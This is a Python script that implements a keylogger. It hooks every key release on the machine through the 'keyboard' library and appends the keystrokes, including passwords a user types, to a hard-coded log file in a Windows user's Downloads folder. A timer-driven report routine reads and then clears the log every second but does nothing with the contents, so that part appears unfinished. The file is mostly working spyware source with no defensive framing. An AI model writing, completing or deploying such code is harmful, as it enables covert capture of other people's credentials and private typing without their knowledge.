import keyboard
import os
from threading import Timer

LOG_FILE = "C:/Users/nikilite/Downloads/lol.txt"  # specify the full path to the log file

class Keylogger:
    def __init__(self, log_file):
        self.log_file = log_file
        self.start()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        
        with open(self.log_file, "a", encoding="utf-8") as file:
            file.write(name)

    def report(self):
        try:
            with open(self.log_file, "r", encoding="utf-8", errors="ignore") as file:
                log = file.read()
        except FileNotFoundError:
            log = ""
        
        if log:
            with open(self.log_file, "w", encoding="utf-8") as file:
                file.write("")
                
        self.timer = Timer(interval=1, function=self.report)
        self.timer.start()

    def start(self):
        keyboard.on_release(callback=self.callback)
        self.report()

    def stop(self):
        if self.timer:
            self.timer.cancel()

if __name__ == "__main__":
    keylogger = Keylogger(log_file=LOG_FILE)